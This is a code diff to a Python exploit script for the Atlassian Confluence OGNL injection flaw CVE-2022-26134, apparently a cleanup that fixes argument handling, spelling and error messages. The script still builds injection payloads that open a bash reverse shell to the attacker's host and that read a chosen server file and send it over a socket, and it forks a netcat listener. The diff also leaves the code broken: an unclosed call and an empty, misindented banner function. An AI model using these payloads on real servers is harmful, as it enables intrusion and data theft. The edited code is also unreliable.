@@ -16,38 +16,19 @@ import time
 import sys
 import os
 
-urllib3.disable_warnings()
+urllib3.disable_warnings(
 
-def do_banner():
-    print("")
-    print("   _____ _                           _     ")
-    print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ") 
-    print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ") 
-    print("   / /  | | | | | | (_) | |_| | (_| | | | |")
-    print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
-    print("                               |___/       ")
-    print("   _____ _            __    __ _           ")
-    print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
-    print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
-    print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
-    print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")
-    print("")
-    print("                 jbaines-r7                ")
-    print("               CVE-2022-26134              ")
-    print("      \"Spit my soul through the wire\"    ")
-    print("                     🦞                   ")
-    print("") 
-
-
+    def do_banner():
+        
 if __name__ == "__main__":
 
     do_banner()
-
+    
     parser = argparse.ArgumentParser(description='Atlassian Confluence Server exploit (CVE-2022-26134)')
     parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to exploit")
-    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to exploit", default="443")
+    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to exploit", default=443)
     parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The local address to connect back to")
-    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default="1270")
+    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default=1270)
     parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="https://")
     parser.add_argument('--reverse-shell', action="store_true", dest="reverse_shell", default=False, help="Execute a bash shell")
     parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, help="Directs the program to start an nc listener")
@@ -60,36 +41,35 @@ if __name__ == "__main__":
         sys.exit(1)
     
     if not args.reverse_shell and not args.read_file:
-        print("[-] User selected neither reverse shell or read file. One must be selected.")
+        print("[-] User selected neither reverse shell nor read file. One must be selected.")
+        sys.exit(1)  # Added exit for this condition to prevent proceeding
 
-    if args.fork_nc == False:
+    if not args.fork_nc:
         print("[!] User has opted not to fork nc")
     else:
         pid = os.fork()
         if pid > 0:
             print('[+] Forking a netcat listener')
             print('[+] Using ' + args.ncpath)
-            os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
+            os.execv(args.ncpath, [args.ncpath, '-lvnp', str(args.lport)])  # Fixed argument splitting
             sys.exit(0)
 
-
-    if args.reverse_shell == True:
+    if args.reverse_shell:
         print('[+] Generating a reverse shell payload')
         exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'
 
     if args.read_file:
         print('[+] Generating a payload to read: ' + args.read_file)
         exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + '); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();"))}'
-        
+
     encoded_exploit = urllib.parse.quote(exploit)
     target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/'
-    print('[+] Sending expoit at ' + target_url)
+    print('[+] Sending exploit at ' + target_url)  # Fixed spelling of "exploit"
     target_url += encoded_exploit
     target_url += '/'
 
     try:
         requests.get(target_url)
-    except:
-        print('[-] The HTTP request failed')
-        sys.exit(0) 
-
+    except Exception as e:  # Catch exceptions and print the error
+        print('[-] The HTTP request failed:', e)
+        sys.exit(0)
